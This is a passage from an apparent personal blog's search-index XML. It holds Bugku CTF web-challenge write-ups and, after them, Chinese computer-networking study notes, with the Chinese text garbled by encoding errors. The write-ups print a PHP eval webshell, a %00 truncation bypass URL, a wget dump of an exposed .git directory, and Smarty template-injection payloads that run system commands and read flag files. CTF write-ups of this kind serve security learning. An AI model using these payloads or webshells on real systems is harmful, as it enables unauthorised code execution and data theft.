class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ•°å­—ä¸å­—ç¬¦æ¯”è¾ƒï¼Œåªä¸æ•°å­—æ¯”è¾ƒï¼Œå¦‚1a&#x3D;&#x3D;1, aa&#x3D;&#x3D;0;</p>
<p>eregi()åŒ¹é…å‡½æ•°ï¼ŒåŒ¹é…åˆ°åˆ™æ˜¯True</p>
<p>eregi å­˜åœ¨%00æˆªæ–­ç»•è¿‡ \x00</p>
<p>$bçš„ç¬¬ä¸€ä½è¦æ˜¯4è€Œä¸”ä¸æ˜¯4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:18061/hello.php?id=ab&amp;a=php://input&amp;b=%001234567</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä½¿ç”¨*é€šé…ç¬¦  åªè¦ä¼ å…¥å°±å¯ä»¥æ»¡è¶³å•¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b=*12345</span><br></pre></td></tr></table></figure>

<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>æ‰“å¼€ï¼Œphpä»£ç æ··æ·†</p>
<p><a href="http://www.zhaoyuanma.com/phpjm.html">phpè§£å¯†åŠ å¯†|phpæ··æ·†ç ´è§£|phpjmç ´è§£|phpdpç¥ç›¾ç ´è§£|phpå¨ç›¾ç ´è§£|phpå¾®ç›¾ç ´è§£|tianyiwç ´è§£|phpæºç ç ´è§£|phpåœ¨çº¿ç ´è§£|phpåç¼–è¯‘|zend6è§£å¯†|Zend Guard 6 ç ´è§£ (zhaoyuanma.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@eval($_POST[ymlisisisiook]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥ï¼Œä½¿ç”¨æ’ä»¶</p>
<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003624.png"></p>
<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003822.png"></p>
<p>è¿æ¥å³å¯</p>
<p>ç¬¬äºŒç§æ–¹æ³•ï¼Œä½¿ç”¨weevelyï¼Œç”Ÿæˆä¸€ä¸ªæœ¨é©¬ä¸Šä¼ ï¼Œ</p>
<p>ç„¶åè¿æ¥ï¼Œå³å¯ç»•è¿‡</p>
<p>è§£æ³•ä¸‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ymlisisisiook=var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>

<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>ä¸‹è½½ç½‘ç«™æ‰€æœ‰æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -r  http://114.67.175.224:13620/.git</span><br></pre></td></tr></table></figure>

<p>cd åˆ°æ–‡ä»¶å¤¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ‰€æœ‰å†å²ç‰ˆæœ¬ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show </span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714122302.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show 40c6d51</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°flag</p>
<h2 id="èªæ˜çš„php"><a href="#èªæ˜çš„php" class="headerlink" title="èªæ˜çš„php"></a>èªæ˜çš„php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pass a parameter <span class="keyword">and</span> maybe the flag file<span class="string">&#x27;s filename is random :&gt; &lt;?php</span></span><br><span class="line"><span class="string">include(&#x27;</span>./libs/Smarty.<span class="keyword">class</span>.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">echo &quot;pass a parameter and maybe the flag file&#x27;</span>s filename is random :&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span> = new Smarty();</span></span><br><span class="line"><span class="string">if(<span class="subst">$_GET</span>)&#123;</span></span><br><span class="line"><span class="string">    highlight_file(&#x27;index.php&#x27;);</span></span><br><span class="line"><span class="string">    foreach (<span class="subst">$_GET</span> AS <span class="subst">$key</span> =&gt; <span class="subst">$value</span>)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        print <span class="subst">$key</span>.&quot;</span>\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        if(preg_match(&quot;</span>/flag|\/flag/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;elseif(preg_match(&quot;</span>/system|readfile|gz|exec|<span class="keyword">eval</span>|cat|assert|file|fgets/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);            </span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        &#125;else&#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$smarty</span>-&gt;display(&quot;</span><span class="keyword">eval</span>:<span class="string">&quot;.<span class="subst">$value</span>);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt; </span></span><br></pre></td></tr></table></figure>

<p><strong>smartyæ¨¡æ¿æ³¨å…¥</strong></p>
<p>å¸¸ç”¨æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¸¸ç”¨payload</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125; </span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; </span><br><span class="line">smartyä¸­çš„&#123;if&#125;æ ‡ç­¾ä¸­å¯ä»¥æ‰§è¡Œphpè¯­å¥</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜è¿‡æ»¤äº†å¥½å¤šï¼Œæ‰€ä»¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;passthru(%27tac%20/_26225%27)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a></h4>]]></content>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¡ç®—æœºç½‘ç»œ</title>
    <url>/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p> è®¡ç®—åŠç½‘ç»œå†…å®¹æœ‰ç‚¹å¤šå†³å®šä¸“é—¨å†™ç¯‡åšå®¢ï¼Œå»æ•´ç†ä¸€ä¸‹</p>
 <span id="more"></span>



<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p><strong>äº’è”ç½‘çš„åŸºæœ¬ç‰¹ç‚¹</strong>ï¼šè¿é€šæ€§å’Œå…±äº«</p>
<p>ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªè®¡ç®—æœºç½‘ç»œæ˜¯<strong>ARPANET</strong></p>
<p>äº’è”ç½‘æœåŠ¡æä¾›è€…ISPï¼Œä¾‹å¦‚ä¸­å›½çš„è”é€šï¼Œç§»åŠ¨ï¼Œç”µä¿¡ã€‚</p>
<h3 id="è®¡ç®—æœºç½‘ç»œçš„å®šä¹‰"><a href="#è®¡ç®—æœºç½‘ç»œçš„å®šä¹‰" class="headerlink" title="è®¡ç®—æœºç½‘ç»œçš„å®šä¹‰"></a>è®¡ç®—æœºç½‘ç»œçš„å®šä¹‰</h3><p>å®šä¹‰ï¼šè®¡ç®—æœºç½‘ç»œæ˜¯å°†åœ°ç†ä½ç½®ä¸åŒçš„ç‹¬ç«‹è®¡ç®—æœºç³»ç»Ÿï¼Œé€šè¿‡ä¼ è¾“ä»‹è´¨é“¾æ¥èµ·æ¥ï¼Œå®ƒä»¬éµå®ˆå…±åŒçš„åè®®ï¼Œ</p>
<p>ç›®çš„ï¼šé€šä¿¡å’Œèµ„æºå…±äº«ã€‚</p>
<p>è®¡ç®—æœºç½‘ç»œï¼ˆç®€ç§°ç½‘ç»œï¼‰æœ‰è‹¥å¹²èŠ‚ç‚¹å’Œè¿æ¥è¿™äº›èŠ‚ç‚¹çš„é“¾è·¯ç»„æˆ</p>
<p>é€šä¿¡ç³»ç»Ÿä¸‰ä¸ªåŸºæœ¬è¦ç´ ï¼š<strong>ä¿¡æºï¼Œé€šä¿¡åª’ä½“ï¼Œä¿¡å®¿</strong>ã€‚</p>
<p>æŒ‰ç…§ç½‘ç»œçš„ä½œç”¨èŒƒå›´è¿›è¡Œåˆ†ç±»ï¼Œ<strong>å¹¿åŸŸç½‘WAN,åŸåŸŸç½‘MANï¼Œå±€åŸŸç½‘LANï¼Œä¸ªäººåŒºåŸŸç½‘PAN</strong>ã€‚</p>
<p>è®¡ç®—æœºç½‘ç»œä¼ è¾“ä¸­å¸¸ç”¨çš„ä¸‰ç§æœ‰é™ä¼ æ’­åª’ä»‹æ˜¯ï¼š<strong>åŒç»çº¿ï¼ŒåŒè½´ç”µç¼†ï¼Œå…‰çº¤</strong>ã€‚</p>
<p>ç½‘ç»œåè®®çš„ä¸»è¦è¦ç´ ä¸ºï¼Œ<strong>è¯­æ³•ï¼Œè¯­ä¹‰ï¼ŒåŒæ­¥</strong>ã€‚</p>
<p>ç½‘ç»œä¸­æ—¶å»¶ä¸»è¦æ˜¯ç”±ä¼ æ’­æ—¶å»¶ï¼Œå‘é€æ—¶å»¶ï¼Œå’Œæ’é˜Ÿæ—¶å»¶ç»„æˆã€‚</p>
<h3 id="ç½‘ç»œåœ°å€"><a href="#ç½‘ç»œåœ°å€" class="headerlink" title="ç½‘ç»œåœ°å€"></a>ç½‘ç»œåœ°å€</h3><p>MACåœ°å€ï¼šæ•°æ®é“¾è·¯å±‚ä½¿ç”¨, ä¹Ÿå«<strong>ç‰©ç†åœ°å€</strong>: ç»‘å®šåœ¨ç½‘å¡ä¸Šçš„ä¸€ä¸ªåœ°å€(ç¡¬ä»¶åœ°å€)ï¼ŒMAC åœ°å€æ˜¯â€ç»å¯¹å”¯ä¸€â€ã€‚</p>
<p>IPåœ°å€ï¼šåœ¨ç½‘ç»œå±‚ï¼Œä¸€ä¸ªç½‘ç»œå†…éƒ¨çš„IPåœ°å€ï¼Œä¸åº”è¯¥é‡å¤ã€‚ç”¨äºæ ‡è¯†ç½‘ç»œä¸»æœºã€å…¶ä»–ç½‘ç»œè®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨ï¼‰çš„ç½‘ç»œåœ°å€ã€‚</p>
<p>ç«¯å£ï¼šâ€ƒåœ¨ç½‘ç»œé€šä¿¡ä¸­ï¼ŒIPåœ°å€ç”¨äºæ ‡è¯†ä¸»æœºç½‘ç»œåœ°å€ï¼Œç«¯å£å·å¯ä»¥æ ‡è¯†ä¸»æœºä¸­å‘é€æ•°æ®ã€æ¥æ”¶æ•°æ®çš„è¿›ç¨‹ã€‚ç®€å•è¯´ï¼šç«¯å£å·ç”¨äºå®šä½ä¸»æœºä¸­çš„è¿›ç¨‹ã€‚</p>
<p>æ ¼å¼:<br>â€ƒç«¯å£å·æ˜¯0~65535èŒƒå›´çš„æ•°å­—ï¼Œåœ¨ç½‘ç»œé€šä¿¡ä¸­ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡ç»‘å®šä¸€ä¸ªç«¯å£å·ï¼Œæ¥å‘é€åŠæ¥æ”¶ç½‘ç»œæ•°æ®ã€‚</p>
<p>â€ƒä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹ï¼Œä¸èƒ½ç»‘å®šåŒä¸€ä¸ªç«¯å£å·ï¼Œä½†ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç»‘å®šå¤šä¸ªç«¯å£å·ã€‚</p>
<p>MACåœ°å€æ˜¯æ•°æ®é“¾è·¯å±‚ä½¿ç”¨åœ°å€ï¼Œè€ŒIPåœ°å€æ˜¯ç½‘ç»œå±‚å’Œä»¥ä¸Šå„å±‚ä½¿ç”¨çš„åœ°å€ï¼Œæ˜¯ä¸€ç§é€»è¾‘åœ°å€</p>
<table>
<thead>
<tr>
<th></th>
<th>ç½‘ç»œåè®®</th>
<th align="center">ç‰©ç†è®¾æ–½</th>
<th>å•ä½</th>
</tr>
</thead>
<tbody><tr>
<td>åº”ç”¨å±‚</td>
<td>http,dns,FTPï¼ŒSMTP,SNMP,POP3,TELENT</td>
<td align="center">ç½‘å…³</td>
<td>æŠ¥æ–‡ï¼Œæ¶ˆæ¯</td>
</tr>
<tr>
<td>ä¼ è¾“å±‚</td>
<td>tcp,udp</td>
<td align="center"></td>
<td>æŠ¥æ–‡ï¼Œæ®µ</td>
</tr>
<tr>
<td>ç½‘ç»œå±‚</td>
<td>ip,ARP,ICMP,IGMP</td>
<td align="center">è·¯ç”±å™¨</td>
<td>æ•°æ®åŒ…</td>
</tr>
<tr>
<td>æ•°æ®é“¾è·¯å±‚</td>
<td>PPP,ethernet</td>
<td align="center">äº¤æ¢æœºç½‘æ¡¥ç½‘å¡</td>
<td>æ•°æ®å¸§</td>
</tr>
<tr>
<td>ç‰©ç†å±‚</td>
<td></td>
<td align="center">é›†çº¿å™¨ï¼Œä¸­ç»§å™¨ï¼Œæ”¾å¤§å™¨</td>
<td>æ¯”ç‰¹</td>
</tr>
</tbody></table>
<h2 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h2><p>æ•°æ®é€šä¿¡ç³»ç»Ÿå¯åˆ†ä¸ºä¸‰å¤§éƒ¨åˆ†ï¼š<strong>æºç³»ç»Ÿï¼Œä¼ è¾“ç³»ç»Ÿï¼Œç›®çš„ç³»ç»Ÿ</strong></p>
<p>ä¿¡é“ä¸€èˆ¬æ˜¯ç”¨æ¥è¡¨ç¤ºå‘æŸä¸€ä¸ªæ–¹å‘ä¼ é€çš„ä¿¡æ¯çš„åª’ä½“ã€‚</p>
<p>ä»é€šä¿¡åŒæ–¹ä¿¡æ¯äº¤äº’æ–¹å¼æ¥çœ‹ï¼Œæœ‰ä¸‰ç§åŸºæœ¬æ–¹å¼ï¼Œ</p>
<p>å•å‘é€šä¿¡ï¼ŒåŒå‘äº¤æ›¿é€šä¿¡ï¼ŒåŒå‘åŒæ—¶é€šä¿¡ã€‚</p>
<p>ä¼ è¾“åª’ä½“å¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå¼•å¯¼æ€§ä¼ è¾“åª’ä½“ï¼ˆåŒç»çº¿ï¼ŒåŒè½´ç”µç¼†ï¼Œå…‰çº¤ï¼‰ï¼Œå’Œéå¼•å¯¼å‹ä¼ è¾“åª’ä½“ï¼ˆæ— çº¿ï¼Œçº¢å¤–ï¼Œå¤§æ°”æ¿€å…‰ï¼‰</p>
<p>å¸¸ç”¨çš„ä¿¡é“å¤åˆ†æŠ€æœ¯æœ‰ï¼šé¢‘åˆ†å¤ç”¨ï¼Œæ—¶åˆ†å¤ç”¨ï¼Œç»Ÿè®¡æ—¶åˆ†å¤ç”¨ï¼Œç åˆ†å¤ç”¨ï¼Œå’Œæ³¢åˆ†å¤ç”¨ã€‚</p>
<p>å…‰çº¤çš„ä¼˜ç‚¹æ˜¯</p>
<ol>
<li>ä¼ è¾“è€—æŸå°ï¼Œä¸­ç»§æ—¶é—´é•¿ï¼Œå¯¹è¿œè·ç¦»ä¼ è¾“ï¼Œç‰¹å˜ç»æµã€‚</li>
<li>æŠ—é›·ç”µå’Œç”µç£å¹²æ‰°æ€§èƒ½å¥½ã€‚</li>
<li>æ— ä¸²éŸ³å¹²æ‰°ï¼Œä¿å¯†æ€§å¥½ï¼Œä¹Ÿä¸å®¹æ˜“è¢«çªƒå¬æˆ–æˆªå–æ•°æ®ã€‚</li>
<li>ä½“ç§¯å°ï¼Œé‡é‡è½»ã€‚</li>
</ol>
<h2 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h2><p> æ•°æ®é“¾è·¯å±‚æœ€åŸºæœ¬çš„æœåŠ¡æ˜¯å°†æºè®¡ç®—æœºç½‘ç»œå±‚æ¥çš„æ•°æ®å¯é çš„ä¼ è¾“åˆ°ç›¸é‚»èŠ‚ç‚¹çš„ç›®æ ‡è®¡ç®—æœºçš„ç½‘ç»œå±‚ã€‚ä¸ºè¾¾åˆ°è¿™ä¸€ç›®çš„ï¼Œæ•°æ®é“¾è·¯å±‚å¿…é¡»å…·å¤‡ä¸€ç³»åˆ—ç›¸åº”çš„åŠŸèƒ½ï¼Œä¸»è¦æœ‰ï¼šå¦‚ä½•å°†æ•°æ®ç»„åˆæˆæ•°æ®å—ï¼ˆåœ¨æ•°æ®é“¾è·¯å±‚ä¸­å°†è¿™ç§æ•°æ®å—ç§°ä¸ºå¸§ï¼Œå¸§æ˜¯æ•°æ®é“¾è·¯å±‚çš„ä¼ é€å•ä½ï¼‰ï¼›å¦‚ä½•æ§åˆ¶å¸§åœ¨ç‰©ç†ä¿¡é“ä¸Šçš„ä¼ è¾“ï¼ŒåŒ…æ‹¬å¦‚ä½•å¤„ç†ä¼ è¾“å·®é”™ï¼Œå¦‚ä½•è°ƒèŠ‚å‘é€é€Ÿç‡ä»¥ä½¿ä¹‹ä¸æ¥æ”¶æ–¹ç›¸åŒ¹é…ï¼›åœ¨ä¸¤ä¸ªç½‘è·¯å®ä½“ä¹‹é—´æä¾›æ•°æ®é“¾è·¯é€šè·¯çš„å»ºç«‹ã€ç»´æŒå’Œé‡Šæ”¾ç®¡ç†ã€‚</p>
<p>   æ•°æ®é“¾è·¯å±‚ä½¿ç”¨çš„ä¿¡é“ä¸»è¦æœ‰ç‚¹å¯¹ç‚¹ä¿¡é“å’Œå¹¿æ’­ä¿¡é“ä¸¤ç§ã€‚</p>
<p>æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜æ˜¯ï¼šå°è£…æˆå¸§ï¼Œé€æ˜ä¼ è¾“ï¼Œå’Œå·®é”™æ£€æµ‹ã€‚</p>
<h3 id="PPPï¼šç‚¹å¯¹ç‚¹åè®®"><a href="#PPPï¼šç‚¹å¯¹ç‚¹åè®®" class="headerlink" title="PPPï¼šç‚¹å¯¹ç‚¹åè®®"></a>PPPï¼šç‚¹å¯¹ç‚¹åè®®</h3><p>ç®€å•ï¼›åªæ£€æµ‹å·®é”™ï¼Œè€Œä¸æ˜¯çº é”™å·®é”™ï¼›ä¸ä½¿ç”¨åºå·ï¼Œä¹Ÿä¸è¿›è¡Œæµé‡æ§åˆ¶ï¼›å¯åŒæ—¶æ”¯æŒå¤šç§ç½‘ç»œå±‚åè®®</p>
<p>é€‚é…å™¨çš„çš„åŠŸèƒ½ï¼ŒåŒ…å«äº†æ•°æ®é“¾è·¯å±‚ä»¥åŠç‰©ç†å±‚ä¸¤ä¸ªå±‚æ¬¡çš„åŠŸèƒ½ã€‚</p>
<p>Ethernetï¼šä»¥å¤ªç½‘åè®®</p>
<p>ä»¥å¤ªç½‘çš„ç¡¬ä»¶åœ°å€ï¼Œå³macåœ°å€å®é™…ä¸Šå°±æ˜¯é€‚é…å™¨åœ°å€æˆ–é€‚é…å™¨æ ‡è¯†ç¬¦ ï¼Œä¸ä¸»æœºæ‰€åœ¨çš„åœ°å€æ— å…³ã€‚æºåœ°å€å’Œç›®æ ‡åœ°å€éƒ½æ˜¯48ä½é•¿ã€‚</p>
<h2 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h2><p>ç½‘ç»œå±‚æä¾›çš„ä¸¤ç§æœåŠ¡ï¼šé¢å‘è¿æ¥çš„è™šç”µè·¯æœåŠ¡ï¼Œæ— è¿æ¥çš„æ•°æ®æŠ¥æœåŠ¡</p>
<p>ç½‘ç»œå±‚ä¸æä¾›æœåŠ¡è´¨é‡çš„æ‰¿è¯ºã€‚</p>
<h3 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h3><p>åœ°å€è§£æåè®®ARPæŠŠIPåœ°å€è§£æä¸ºmacåœ°å€ï¼Œå®ƒè§£å†³äº†åŒä¸€ä¸ªå±€åŸŸç½‘ä¸Šçš„ä¸»æœºæˆ–è·¯ç”±å™¨çš„IPåœ°å€å’ŒMACåœ°å€çš„æ˜ å°„é—®é¢˜ã€‚ARPçš„é«˜é€Ÿç¼“å­˜å¯ä»¥å¤§å¤§å‡å°‘ç½‘ç»œä¸Šçš„é€šä¿¡é‡ã€‚</p>
<p>IPåœ°å€32ä½äºŒè¿›åˆ¶ä»£ç ï¼Œå¸¸ç”¨ç‚¹åˆ†åè¿›åˆ¶è®°å¿†æ³•ã€‚</p>
<h3 id="ICMPåè®®"><a href="#ICMPåè®®" class="headerlink" title="ICMPåè®®"></a>ICMPåè®®</h3><p>ä½¿ç”¨icmpå¹¶éä¸ºäº†å®ç°å¯é ä¼ è¾“ï¼ŒICMPå…è®¸ä¸»æœºæˆ–è·¯ç”±å™¨æŠ¥å‘Šå·®é”™æƒ…å†µå’Œæä¾›æœ‰å…³å¼‚å¸¸æƒ…å†µçš„æŠ¥å‘Šã€‚</p>
<p>ICMPæŠ¥æ–‡çš„ç§ç±»æœ‰ä¸¤ç§ï¼ŒICMPçš„å·®é”™æŠ¥æ–‡å’ŒICMPçš„è¯¢é—®æŠ¥æ–‡ã€‚</p>
<p>ICMPçš„ä¸€ä¸ªé‡è¦åº”ç”¨å°±æ˜¯åˆ†ç»„ç½‘é—´æ¢æµ‹pingï¼Œç”¨æ¥æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„è¿é€šæ€§ã€‚</p>
<h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><p>IPv6çš„ç›®çš„åœ°å€å¯ä»¥æ˜¯ä»¥ä¸‹ä¸‰ç§åŸºæœ¬ç±»å‹åœ°å€ä¹‹ä¸€ï¼š<strong>å•æ’­ï¼Œå¤šæ’­ï¼Œå’Œä»»æ’­ã€‚</strong></p>
<p>IPv6æ‰€å¸¦æ¥çš„å˜åŒ–ï¼Œ</p>
<ol>
<li>æ›´å¤§çš„åœ°å€ç©ºé—´ï¼ˆé‡‡ç”¨128ä½çš„åœ°å€ï¼‰</li>
<li>çµæ´»çš„é¦–éƒ¨æ ¼å¼</li>
<li>æ”¹è¿›çš„é€‰é¡¹</li>
<li>æ”¯æŒå³æ’å³ç”¨</li>
<li>æ”¯æŒèµ„æºçš„é¢„åˆ†é…</li>
<li>IPV6çš„é¦–éƒ¨æ”¹ä¸ºå…«å­—èŠ‚å¯¹é½</li>
</ol>
<p>IPv 6çš„åœ°å€é‡‡ç”¨å†’å·åå…­è¿›åˆ¶è®°æ³•ã€‚</p>
<h2 id="è¿è¾“å±‚"><a href="#è¿è¾“å±‚" class="headerlink" title="è¿è¾“å±‚"></a>è¿è¾“å±‚</h2><p>è¿è¾“å±‚å‘å®ƒä¸Šé¢çš„åº”ç”¨å±‚æä¾›é€šä¿¡æœåŠ¡</p>
<p>ä¸ç½‘ç»œå±‚çš„åŒºåˆ«</p>
<p>ç½‘ç»œå±‚ä¸ºä¸»æœºä¹‹é—´çš„é€šä¿¡æä¾›æœåŠ¡ï¼Œè€Œè¿è¾“å±‚åˆ™åœ¨ç½‘ç»œå±‚çš„åŸºç¡€ä¸Šï¼Œä¸ºåº”ç”¨è¿›ç¨‹ä¹‹é—´æä¾›æœåŠ¡ã€‚</p>
<h3 id="UDPåè®®ï¼šç”¨æˆ·æ•°æ®æŠ¥åè®®"><a href="#UDPåè®®ï¼šç”¨æˆ·æ•°æ®æŠ¥åè®®" class="headerlink" title="UDPåè®®ï¼šç”¨æˆ·æ•°æ®æŠ¥åè®®"></a><code>UDP</code>åè®®ï¼šç”¨æˆ·æ•°æ®æŠ¥åè®®</h3><ol>
<li>æ— è¿æ¥</li>
<li>å°½æœ€å¤§åŠªåŠ›äº¤ä»˜</li>
<li>é¢å‘æŠ¥æ–‡</li>
<li>æ— æ‹¥å¡æ§åˆ¶</li>
<li>æ”¯æŒä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡</li>
<li>é¦–éƒ¨å¼€é”€å°ï¼ˆåªæœ‰å››ä¸ªå­—æ®µï¼Œæºç«¯å£ï¼Œç›®çš„ç«¯å£ï¼Œé•¿åº¦å’Œæ ¡éªŒå’Œï¼‰</li>
</ol>
<h3 id="TCPï¼šä¼ è¾“æ§åˆ¶åè®®"><a href="#TCPï¼šä¼ è¾“æ§åˆ¶åè®®" class="headerlink" title="TCPï¼šä¼ è¾“æ§åˆ¶åè®®"></a><code>TCP</code>ï¼šä¼ è¾“æ§åˆ¶åè®®</h3><p>ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹</p>
<ol>
<li>é¢å‘è¿æ¥</li>
<li>æ¯ä¸€æ¡tcpè¿æ¥åªèƒ½æ˜¯ç‚¹å¯¹ç‚¹çš„</li>
<li>æä¾›å¯é äº¤ä»˜çš„æœåŠ¡</li>
<li>æä¾›å…¨åŒå·¥é€šä¿¡</li>
<li>é¢å‘å­—èŠ‚æµ</li>
</ol>
<h2 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h2><p>åº”ç”¨å±‚æä¾›åº”ç”¨è¿›ç¨‹é—´çš„é€»è¾‘é€šä¿¡</p>
<p><code>HTTP</code>ï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®®<br><code>DNS</code>ï¼šåŸŸåè§£æåè®®<br>FTPï¼šæ–‡ä»¶ä¼ é€åè®®<br>SMTPï¼šç®€å•é‚®ä»¶ä¼ é€åè®®<br>SNMPï¼šç®€å•ç½‘ç»œç®¡ç†åè®®<br>POP3ï¼šé‚®ä»¶è¯»å–åè®®<br>Telnetï¼šè¿œç¨‹ç»ˆç«¯åè®®</p>
]]></content>
      <tags>
        <tag>ä¸“ä¸š</tag>
      </tags>
  </entry>
</search>
